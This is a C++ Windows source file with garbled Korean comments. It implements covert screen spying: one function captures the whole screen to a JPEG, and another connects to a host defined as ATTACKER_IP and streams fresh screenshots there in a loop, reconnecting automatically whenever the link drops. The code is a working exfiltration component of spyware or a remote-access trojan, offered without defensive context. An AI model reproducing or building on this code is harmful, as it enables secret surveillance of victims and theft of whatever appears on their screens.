#include"main.h"

PVOID GetSockExtAPI(SOCKET sock, GUID guidFn)	//�Լ� ������ ��� 
{
	PVOID pfn = NULL;
	GUID guid = guidFn;
	DWORD dwbytes = 0;
	LONG lRet = ::WSAIoctl
	(
		sock,									//���� �ĺ�	
		SIO_GET_EXTENSION_FUNCTION_POINTER,		//�Լ� ������ ���� ��´�
		&guid,									//�Է� ���ۿ� ���� ������
		sizeof(guid),							//�Է� ������ ũ��
		&pfn,									//��� ���ۿ� ���� ������
		sizeof(pfn),							//��� ������ ũ��
		&dwbytes,								//���� ��� ����Ʈ ���� ���� ������
		NULL,
		NULL);

	if (lRet == SOCKET_ERROR)
	{
		SocketError(L"WSAIoctl Error");
		return NULL;
	}
	return pfn;
}



void capture()
{

	HDC hdc = ::GetWindowDC(NULL);												//ȭ�� ��ü�� ĸ���ϱ� ���ؼ� window DC�� ����Ѵ�.

	CImage image;																//ĸ�Ŀ� ����� Cimage��ü�� �����Ѵ�.

	int cx = ::GetSystemMetrics(SM_CXSCREEN);									//���� �ػ󵵸� ��´�.

	int cy = ::GetSystemMetrics(SM_CYSCREEN);									//���� �ػ󵵸� ��´�.

	int color_pth = ::GetDeviceCaps(hdc, BITSPIXEL);							//ȭ���� ���� ���� ��´�

	image.Create(cx, cy, color_pth, 0);											//ĸ�Ŀ� ����� �̹����� �����Ѵ�

	::BitBlt(image.GetDC(), 0, 0, cx, cy, hdc, 0, 0, SRCCOPY);					//ȭ�� ��ü �̹����� m_tips_image��ü�� �����Ѵ�.

	image.Save(IMAGE_PATH, Gdiplus::ImageFormatJPEG);						//d:\\test.jpeg

	::ReleaseDC(NULL, hdc);														//ȭ�� ĸ�Ŀ� ����ߴ� DC�� �����Ѵ�.

	image.ReleaseDC();

}

void image_trans()
{
	
	char size[4] = { 0, };
	SOCKET ssock ;
	SOCKADDR_IN saddr = { 0, };
	int errcode = 0;
	

	
	/*SOCKET ssock = socket(AF_INET, SOCK_STREAM, 0);

	if (ssock == INVALID_SOCKET)
	{
			cout << "socket failed, code : " << WSAGetLastError() << endl;

	}*/

	ssock = socket(AF_INET, SOCK_STREAM, 0);
	WSAEVENT sevent = WSACreateEvent();
	WSAEventSelect(ssock, sevent, FD_CONNECT);

	
	ZeroMemory(&saddr, sizeof(saddr));
	//std::memset(&saddr, 0, sizeof(SOCKADDR_IN));
	saddr.sin_family = AF_INET;
	saddr.sin_addr.s_addr = inet_addr(ATTACKER_IP);
	saddr.sin_port = htons(IMAGE_TRANS_PORT);


	while (connect(ssock, (LPSOCKADDR)&saddr, sizeof(saddr)) == SOCKET_ERROR)
	{

		if (WSAGetLastError() == WSAEISCONN)
			break;

		cout << "���� �����" << endl;
		Sleep(1000);
	}

	while (1) {

		DWORD dwWaitCode = MsgWaitForMultipleObjects(1, &sevent, FALSE, 30, QS_POSTMESSAGE);
		if (dwWaitCode == WAIT_FAILED)
		{
			SystemError(L"MsgWaitForMulileObject Error");
			//goto $connect;
			cout << GetLastError() << endl;
			break;
		}
		if (dwWaitCode == WAIT_OBJECT_0 + 1)
			break;
		
		WSANETWORKEVENTS ne = { 0, };
		WSAEnumNetworkEvents(ssock, sevent, &ne);

		if (ne.lNetworkEvents & FD_CONNECT) 
		{

			int errcode = ne.iErrorCode[FD_CONNECT_BIT];
			if (errcode != 0)
				goto $connect;

			sevent = WSACreateEvent();
			WSAEventSelect(ssock, sevent, FD_WRITE | FD_CLOSE);
			
			
			continue;
		}


		
		
		
		if (ne.lNetworkEvents & FD_CLOSE) 
		{
			
			
		$connect:
			if (ssock)
				closesocket(ssock);
			if (sevent)
				CloseHandle(sevent);

			ssock = socket(AF_INET, SOCK_STREAM, 0);
			sevent = WSACreateEvent();
			
			WSAEventSelect(ssock, sevent, FD_CONNECT);

			
			while (connect(ssock, (LPSOCKADDR)&saddr, sizeof(saddr)) == SOCKET_ERROR) {

				if (WSAGetLastError() == WSAEISCONN)
					break;

				cout << "trans ������ �����" << endl;

				Sleep(1000);
			}

		}

		cout << "dd" << endl;
		capture();
		//���� ���
		wstring str = { IMAGE_PATH };

		//���� ����
		HANDLE hfile = CreateFile(str.c_str(), GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
		if (hfile == INVALID_HANDLE_VALUE)
		{
			cout << str.c_str() << " open failed, code : " << GetLastError() << endl;
			goto $connect;
		}

		//������ ���� ���� ũ�⸦ ŉ���Ѵ�
		LARGE_INTEGER llsize;
		GetFileSizeEx(hfile, &llsize);

		//���Ͽ� ���� �޸� ���� ���� Ŀ�� ��ü�� �����ϰ� ���ϰ� �����Ѵ�
		HANDLE hmmf = CreateFileMapping(hfile, NULL, PAGE_READONLY, llsize.HighPart, llsize.LowPart, NULL);
		if (hmmf == NULL)
		{
			cout << str.c_str() << "CreateFileMapping failed : " << GetLastError() << endl;
			goto $connect;
		}



		//�����ڿ��� �̹��� ���� ������ ũ�� ���� ����
		ZeroMemory(size, sizeof(int));
		*((int*)size) = llsize.QuadPart;
		if (send(ssock, size, sizeof(int), 0) == SOCKET_ERROR) {
			SocketError(L"Image Size Send Error");
			goto $connect;
		}
		DWORD dwcpysize = llsize.QuadPart;

		ZeroMemory(&llsize, sizeof(LARGE_INTEGER));
		PVOID pdata = MapViewOfFile(hmmf, FILE_MAP_READ, llsize.HighPart, llsize.LowPart, dwcpysize);
		if (pdata == NULL)
		{

			SystemError(L"MapViewOfFile Error");
			goto $connect;
		}
		//������ ���ε� �޸��� �����͸� �������� ���Ͽ� ŉ���Ѵ�.
		TRANSMIT_PACKETS_ELEMENT tp;
		tp.dwElFlags = TP_ELEMENT_MEMORY;		//������ �����ʹ� �޸� ���� ���������� �˷��ֱ� ���� TP_ELEMENT_MEMORY���� �����Ѵ�. �׸��� �޸𸮿� �ʵ� ��ġ�� �ּҸ� �� pbuffer�ʵ忡 �����Ѵ�
		tp.cLength = dwcpysize;					//���� ����Ʈ �� ����0�̸� ��ü��������
		tp.pBuffer = pdata;						//TP_ELEMENT_MEMORY�϶��� ��ȿ�ϸ�, ������ �����Ͱ� ����� ���۸� ����Ų��


		LPFN_TRANSMITPACKETS pfntranspackets = (LPFN_TRANSMITPACKETS)GetSockExtAPI(ssock, WSAID_TRANSMITPACKETS);		//transmitpackets �Լ� �����͸� ��´�

		//�޸� ���� ����� �����Ѵ�
		BOOL blsok = pfntranspackets(ssock, &tp, 1, 0, NULL, 0);
		if (!blsok)
		{
			cout << "TransFileError : " << GetLastError() << endl;
			goto $connect;
		}

		UnmapViewOfFile(pdata);

		CloseHandle(hfile);
		CloseHandle(hmmf);
		
		printf(" <= Sent total %d bytes, program terminates...\n", dwcpysize);	//���� ũ�� �׽�Ʈ(�� ����� ���)

		Sleep(20);					//30������

		continue;

	}

}

